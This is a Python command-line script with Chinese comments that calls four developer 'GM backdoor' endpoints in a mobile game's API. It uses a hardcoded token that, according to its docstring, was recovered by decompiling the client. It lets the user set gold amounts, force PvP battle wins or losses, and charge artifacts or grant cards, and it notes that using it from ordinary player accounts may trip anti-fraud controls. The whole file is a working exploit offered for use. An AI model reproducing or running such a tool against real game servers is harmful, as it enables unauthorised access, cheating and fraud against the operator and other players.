"""
占城大师 GM API 客户端 —— 基于 dump.cs 反编译的 4 个后门端点
依赖: requests
用法:
  python gm_api.py --host http://your-server:8509 --cmd pvpBattleWin --battle-id <id>
  python gm_api.py --host <url> --cmd set-gold --amount 99999

注意: 这是开发者测试后门, 普通玩家账号调可能会被风控.
"""
import sys, json, argparse, requests

# 来自 dump.cs CheatControl 类
GM_TOKEN = "local-frame-relay-gm-token"
GM_ENDPOINTS = {
    "battle-gold":        "/gm/api/battle-gold",
    "battle-result":      "/gm/api/battle-result",
    "battle-artifact-charge": "/gm/api/battle-artifact-charge",
    "battle-hex-card":    "/gm/api/battle-hex-card",
}
GM_COMMANDS = {
    "pvpBattleWin":  "PVP 战斗强制胜利",
    "pvpBattleLose": "PVP 战斗强制失败",
}

def call_gm(host, endpoint, payload=None, method="POST", timeout=10):
    """调 GM 后门 — 鉴权用 local-frame-relay-gm-token"""
    url = f"{host.rstrip('/')}{GM_ENDPOINTS[endpoint]}"
    headers = {"X-GM-Token": GM_TOKEN, "Content-Type": "application/json"}
    if method.upper() == "POST":
        r = requests.post(url, json=payload or {}, headers=headers, timeout=timeout)
    elif method.upper() == "GET":
        r = requests.get(url, params=payload or {}, headers=headers, timeout=timeout)
    else:
        raise ValueError(f"unsupported method: {method}")
    return r.status_code, r.text

def main():
    ap = argparse.ArgumentParser(description="占城大师 GM API 客户端 (后门)")
    ap.add_argument("--host", required=True, help="游戏 host URL, e.g. http://1.2.3.4:8509")
    ap.add_argument("--endpoint", choices=list(GM_ENDPOINTS), default="battle-gold",
                    help="GM 端点")
    ap.add_argument("--cmd", choices=list(GM_COMMANDS), help="GM 命令名 (业务逻辑)")
    ap.add_argument("--battle-id", help="战斗 ID")
    ap.add_argument("--amount", type=int, help="金币数量 (battle-gold 用)")
    ap.add_argument("--result", choices=["win", "lose"], help="battle-result 用")
    ap.add_argument("--artifact-id", help="battle-artifact-charge 用")
    ap.add_argument("--card-id", help="battle-hex-card 用")
    ap.add_argument("--method", default="POST", choices=["GET", "POST"])
    ap.add_argument("--raw", help="raw JSON payload (覆盖其他参数)")
    args = ap.parse_args()

    if args.raw:
        payload = json.loads(args.raw)
    else:
        payload = {}
        if args.cmd:
            payload["command"] = args.cmd
        if args.battle_id:
            payload["battleId"] = args.battle_id
        if args.amount is not None:
            payload["amount"] = args.amount
        if args.result:
            payload["result"] = args.result
        if args.artifact_id:
            payload["artifactId"] = args.artifact_id
        if args.card_id:
            payload["cardId"] = args.card_id

    print(f"==> POST {args.host}{GM_ENDPOINTS[args.endpoint]}")
    print(f"    Token: {GM_TOKEN}")
    print(f"    Payload: {json.dumps(payload, ensure_ascii=False)}")
    code, body = call_gm(args.host, args.endpoint, payload, args.method)
    print(f"<== {code}")
    print(body[:500])

if __name__ == "__main__":
    main()
